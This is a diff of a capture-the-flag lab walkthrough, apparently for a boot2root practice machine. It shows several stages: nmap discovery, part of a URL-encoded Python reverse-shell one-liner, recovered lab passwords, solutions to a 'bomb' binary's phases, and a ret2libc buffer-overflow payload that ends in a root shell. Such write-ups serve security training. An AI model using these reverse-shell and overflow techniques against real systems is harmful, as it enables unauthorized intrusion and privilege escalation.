@@ -1,3 +1,4 @@
+# Information Gathering
 We have no info about the machine we can begin finding the IP of the machine and some open ports
 
 nmap -sn 172.20.10.0/24
@@ -68,6 +69,8 @@ python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.
 
 in /home/LOOKATME we have lmezard password : G!@M6f4Eatau{sF"
 
+# lmezard
+
 we have a file in lmezard home named fun if we make strings fun we can see with some greps that the password is : getme1() + getme2() + ... + getme12() functions
 
 	printf("%c",getme1());
@@ -90,6 +93,10 @@ The format of files is /file followed by number and then the content I put it in
 
 Iheartpwnage in SHA256 = 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 
+laurie password = 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+# Bomb binary laurie
+
 Now we have bomb binary decompiling it we can try to defuse :
 
 First input : Public speaking is very easy.
@@ -105,6 +112,78 @@ Each subsequent number must follow the pattern defined in the loop:
 
 Second input : 1 2 6 24 120 720
 
-Third input : 
+Third input : 7 b 524
+
+Fourth input : 9
 
 
+Fifth :
+
+.data:0804B220 array_123       db 69h  ; i
+.data:0804B221                 db  73h ; s
+.data:0804B222                 db  72h ; r
+.data:0804B223                 db  76h ; v
+.data:0804B224                 db  65h ; e
+.data:0804B225                 db  61h ; a
+.data:0804B226                 db  77h ; w
+.data:0804B227                 db  68h ; h
+.data:0804B228                 db  6Fh ; o
+.data:0804B229                 db  62h ; b
+.data:0804B22A                 db  70h ; p
+.data:0804B22B                 db  6Eh ; n
+.data:0804B22C                 db  75h ; u
+.data:0804B22D                 db  74h ; t
+.data:0804B22E                 db  66h ; f
+.data:0804B22F                 db  67h ; g
+
+We have to build the string giants with the letters in array_123 so we need to have index & 15
+
+array_123[15] + array_123[0] + array_123[5] + array_123[11] + array_123[13] + array_123[1]
+
+index = index & 15
+
+Fifth input : o0ukmA (one of the possibility more in the script)
+# if we only take ascii lowercase uppercase and digits
+g: ['o', 'O']
+i: ['p', 'P', '0']
+a: ['e', 'u', 'E', 'U', '5']
+n: ['k', 'K']
+t: ['m', 'M']
+s: ['a', 'q', 'A', 'Q', '1']
+
+Sixth :
+node1 = 253
+node2 = 725
+node3 = 301
+node4 = 997
+node5 = 212
+node6 = 432
+We have to sort the node in descending order doing permutations in the input (input < 6)
+
+Sixth input : 4 2 6 3 1 5
+
+with the different possibilites we had to bruteforce to find the password with string.ascii_lowercase
+
+Thor password : Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+# Thor
+
+For thor we have a turtle file with instruction we will resolve it with python script it's writing the word SLASH
+
+https://www.browserling.com/tools/all-hashes
+and we have to hash it as said at the end of the file and in MD5 it gives us : 646da671ca01bb5d84dbb5fb2238dc8e
+
+
+Zaz password : 646da671ca01bb5d84dbb5fb2238dc8e
+
+# Zaz
+
+In this binary when decompiled we direcly see the buffer overflow we'll do a ret2libc to gain a shell
+
+p system : 0xb7e6b060
+find 0xb7e2c000,0xb7fcf000,"/bin/sh" : 0xb7f8cc58
+p exit : 0xb7e5ebe0
+
+Offset 140 calculated with [pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) => print("A" * 140) + struct.pack("I", 0xb7e6b060) + struct.pack("I", 0xb7e5ebe0) + struct.pack("I", 0xb7f8cc58)
+
+We have a root shell
